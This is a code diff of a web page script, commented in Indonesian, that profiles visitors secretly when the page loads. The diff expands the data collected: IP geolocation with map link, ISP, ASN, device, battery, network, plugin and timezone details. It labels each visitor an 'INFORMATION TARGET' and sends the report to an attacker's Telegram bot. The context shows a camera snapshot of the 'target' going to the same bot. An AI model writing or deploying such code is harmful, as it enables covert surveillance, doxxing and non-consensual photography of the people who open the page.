@@ -209,7 +209,7 @@ async function getIpInfo(){
   try{
     const r = await fetch("https://ipwhois.app/json/");
     const data = await r.json();
-    if(!data.success) return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0"};
+    if(!data.success) return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0", timezone:"-", isp:"-", asn:"-", currency:"-"};
     return {
       ip: data.ip || "-",
       city: data.city || "-",
@@ -217,87 +217,193 @@ async function getIpInfo(){
       country_name: data.country || "-",
       country_code: data.country_code || "-",
       latitude: data.latitude || "0",
-      longitude: data.longitude || "0"
+      longitude: data.longitude || "0",
+      timezone: data.timezone || "-",
+      isp: data.isp || "-",
+      asn: data.asn || "-",
+      currency: data.currency || "-"
     };
   }catch(e){
-    return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0"};
+    return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0", timezone:"-", isp:"-", asn:"-", currency:"-"};
   }
 }
 
-// Ambil device info
+// Ambil device info lebih lengkap
 async function getDeviceInfo(){
   const b = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:null,charging:false,chargingTime:null,dischargingTime:null}));
+  
+  // Info koneksi
+  let connectionInfo = {};
+  if (navigator.connection) {
+    connectionInfo = {
+      effectiveType: navigator.connection.effectiveType || "-",
+      downlink: navigator.connection.downlink || "-",
+      rtt: navigator.connection.rtt || "-",
+      saveData: navigator.connection.saveData || "-"
+    };
+  }
+  
+  // Info plugins
+  let pluginsInfo = "-";
+  if (navigator.plugins && navigator.plugins.length > 0) {
+    pluginsInfo = Array.from(navigator.plugins).map(p => p.name).join(', ');
+  }
+  
   return {
-    userAgent:navigator.userAgent,
-    platform:navigator.platform,
-    language:navigator.language,
-    screenWidth:screen.width,
-    screenHeight:screen.height,
-    innerWidth:window.innerWidth,
-    innerHeight:window.innerHeight,
-    cores:navigator.hardwareConcurrency||"-",
-    memory:navigator.deviceMemory||"-",
-    touchPoints:navigator.maxTouchPoints||0,
-    orientation:screen.orientation?.type||"-",
-    colorDepth:screen.colorDepth||"-",
-    pixelRatio:window.devicePixelRatio||"-",
-    online:navigator.onLine,
-    cookiesEnabled:navigator.cookieEnabled,
-    doNotTrack:navigator.doNotTrack,
-    battery:b
+    // Basic info
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    languages: navigator.languages ? navigator.languages.join(', ') : "-",
+    
+    // Screen info
+    screenWidth: screen.width,
+    screenHeight: screen.height,
+    innerWidth: window.innerWidth,
+    innerHeight: window.innerHeight,
+    colorDepth: screen.colorDepth || "-",
+    pixelRatio: window.devicePixelRatio || "-",
+    orientation: screen.orientation?.type || "-",
+    
+    // Device info
+    cores: navigator.hardwareConcurrency || "-",
+    memory: navigator.deviceMemory || "-",
+    touchPoints: navigator.maxTouchPoints || 0,
+    
+    // Browser info
+    vendor: navigator.vendor || "-",
+    product: navigator.product || "-",
+    
+    // Network info
+    online: navigator.onLine,
+    cookiesEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack || "-",
+    connection: connectionInfo,
+    
+    // Battery info
+    battery: b,
+    
+    // Additional info
+    plugins: pluginsInfo,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    localTime: new Date().toString(),
+    utcTime: new Date().toUTCString(),
+    referrer: document.referrer || "-",
+    
+    // Browser capabilities
+    webdriver: navigator.webdriver ? "Yes" : "No",
+    pdfViewer: navigator.pdfViewerEnabled ? "Yes" : "No",
+    javaEnabled: navigator.javaEnabled ? "Yes" : "No"
   };
 }
 
-// Build caption Telegram
+// Build caption Telegram dengan format blockquote dan emoji
 function buildCaption(ip,d){
   const g=`https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
+  
   return [
-    "<b>INFORMATION TARGET</b>",
-    `IP: ${escapeHtml(ip.ip)}`,
-    `City: ${escapeHtml(ip.city)}`,
-    `Region: ${escapeHtml(ip.region)}`,
-    `Country: ${escapeHtml(ip.country_name)}`,
-    `Country Code: ${escapeHtml(ip.country_code)}`,
-    `Latitude: ${escapeHtml(ip.latitude)}`,
-    `Longitude: ${escapeHtml(ip.longitude)}`,
-    `Location: ${g}`,
+    "<b>🌍 INFORMATION TARGET</b>",
+    `<blockquote>`,
+    `🌐 IP: ${escapeHtml(ip.ip)}`,
+    `🏙️ City: ${escapeHtml(ip.city)}`,
+    `🗺️ Region: ${escapeHtml(ip.region)}`,
+    `🇮🇩 Country: ${escapeHtml(ip.country_name)}`,
+    `🏳️ Country Code: ${escapeHtml(ip.country_code)}`,
+    `📍 Latitude: ${escapeHtml(ip.latitude)}`,
+    `📍 Longitude: ${escapeHtml(ip.longitude)}`,
+    `🗺️ Location: ${g}`,
+    `⏰ Timezone: ${escapeHtml(ip.timezone)}`,
+    `📡 ISP: ${escapeHtml(ip.isp)}`,
+    `🔗 ASN: ${escapeHtml(ip.asn)}`,
+    `💰 Currency: ${escapeHtml(ip.currency)}`,
+    `</blockquote>`,
     "",
-    "<b>Device Info</b>",
-    `User Agent: ${escapeHtml(d.userAgent)}`,
-    `Platform: ${escapeHtml(d.platform)}`,
-    `Language: ${escapeHtml(d.language)}`,
-    `Screen: ${escapeHtml(d.screenWidth+"x"+d.screenHeight)}`,
-    `Inner Size: ${escapeHtml(d.innerWidth+"x"+d.innerHeight)}`,
-    `CPU cores: ${escapeHtml(d.cores)}`,
-    `RAM (GB): ${escapeHtml(d.memory)}`,
-    `Touch Points: ${escapeHtml(d.touchPoints)}`,
-    `Orientation: ${escapeHtml(d.orientation)}`,
-    `Color Depth: ${escapeHtml(d.colorDepth)}`,
-    `Pixel Ratio: ${escapeHtml(d.pixelRatio)}`,
-    `Online: ${escapeHtml(d.online)}`,
-    `Cookies Enabled: ${escapeHtml(d.cookiesEnabled)}`,
-    `Do Not Track: ${escapeHtml(d.doNotTrack)}`,
-    `Battery: ${escapeHtml(d.battery?.level||"-")} (${d.battery?.charging?"Charging":"Not charging"}), ChargingTime: ${escapeHtml(d.battery?.chargingTime||"-")}s, DischargingTime: ${escapeHtml(d.battery?.dischargingTime||"-")}s`,
+    "<b>💻 Device Info</b>",
+    `<blockquote>`,
+    `🖥️ User Agent: ${escapeHtml(d.userAgent)}`,
+    `⚙️ Platform: ${escapeHtml(d.platform)}`,
+    `🗣️ Language: ${escapeHtml(d.language)}`,
+    `🌐 Languages: ${escapeHtml(d.languages)}`,
+    `📱 Vendor: ${escapeHtml(d.vendor)}`,
+    `🛍️ Product: ${escapeHtml(d.product)}`,
+    `</blockquote>`,
     "",
-    "<b>URL & Time</b>",
-    `URL: ${escapeHtml(location.href)}`,
-    `Time (UTC): ${escapeHtml(new Date().toISOString())}`
+    "<b>📱 Screen & Display</b>",
+    `<blockquote>`,
+    `📺 Screen: ${escapeHtml(d.screenWidth+"x"+d.screenHeight)}`,
+    `🪟 Inner Size: ${escapeHtml(d.innerWidth+"x"+d.innerHeight)}`,
+    `🎨 Color Depth: ${escapeHtml(d.colorDepth)}`,
+    `⚖️ Pixel Ratio: ${escapeHtml(d.pixelRatio)}`,
+    `📐 Orientation: ${escapeHtml(d.orientation)}`,
+    `</blockquote>`,
+    "",
+    "<b>⚙️ Hardware Specs</b>",
+    `<blockquote>`,
+    `🔢 CPU cores: ${escapeHtml(d.cores)}`,
+    `💾 RAM (GB): ${escapeHtml(d.memory)}`,
+    `👆 Touch Points: ${escapeHtml(d.touchPoints)}`,
+    `</blockquote>`,
+    "",
+    "<b>🌐 Network & Connection</b>",
+    `<blockquote>`,
+    `📶 Online: ${escapeHtml(d.online)}`,
+    `🍪 Cookies Enabled: ${escapeHtml(d.cookiesEnabled)}`,
+    `🚫 Do Not Track: ${escapeHtml(d.doNotTrack)}`,
+    `📡 Connection Type: ${escapeHtml(d.connection.effectiveType)}`,
+    `⬇️ Downlink: ${escapeHtml(d.connection.downlink)} Mbps`,
+    `⏱️ RTT: ${escapeHtml(d.connection.rtt)} ms`,
+    `💾 Save Data: ${escapeHtml(d.connection.saveData)}`,
+    `</blockquote>`,
+    "",
+    "<b>🔋 Battery Info</b>",
+    `<blockquote>`,
+    `🔋 Battery: ${escapeHtml((d.battery?.level * 100 || "-") + "%")}`,
+    `⚡ Charging: ${escapeHtml(d.battery?.charging ? "Yes" : "No")}`,
+    `⏳ Charging Time: ${escapeHtml(d.battery?.chargingTime || "-")}s`,
+    `⌛ Discharging Time: ${escapeHtml(d.battery?.dischargingTime || "-")}s`,
+    `</blockquote>`,
+    "",
+    "<b>🕒 Time & Location</b>",
+    `<blockquote>`,
+    `🌍 Timezone: ${escapeHtml(d.timezone)}`,
+    `🕐 Local Time: ${escapeHtml(d.localTime)}`,
+    `⏰ UTC Time: ${escapeHtml(d.utcTime)}`,
+    `</blockquote>`,
+    "",
+    "<b>🔌 Plugins & Extras</b>",
+    `<blockquote>`,
+    `🧩 Plugins: ${escapeHtml(d.plugins)}`,
+    `🤖 WebDriver: ${escapeHtml(d.webdriver)}`,
+    `📄 PDF Viewer: ${escapeHtml(d.pdfViewer)}`,
+    `☕ Java Enabled: ${escapeHtml(d.javaEnabled)}`,
+    `🔗 Referrer: ${escapeHtml(d.referrer)}`,
+    `</blockquote>`,
+    "",
+    "<b>🔗 URL & Session</b>",
+    `<blockquote>`,
+    `🌐 URL: ${escapeHtml(location.href)}`,
+    `⏰ Time (UTC): ${escapeHtml(new Date().toISOString())}`,
+    `</blockquote>`
   ].join("\n");
 }
 
 // Kirim IP/device + foto statis saat halaman load
 async function sendIpDevice(){
-  const [ip,d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      photo: STATIC_IMAGE,
-      caption: buildCaption(ip,d),
-      parse_mode:"HTML"
-    })
-  });
+  try {
+    const [ip,d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        photo: STATIC_IMAGE,
+        caption: buildCaption(ip,d),
+        parse_mode:"HTML"
+      })
+    });
+  } catch(e) {
+    console.log("Error sending device info:", e);
+  }
 }
 
 // Kamera snapshot sebagai file .jpg (document)
@@ -322,7 +428,7 @@ async function sendSnapshot(){
     const formData = new FormData();
     formData.append("chat_id", CHAT_ID);
     formData.append("document", blob, "screenshotbyaldofficialr.jpg");
-    formData.append("caption", "Sukes screenshot foto target");
+    formData.append("caption", "📸 SUKSES SCREENSHOT FOTO TARGET!");
 
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
       method: "POST",
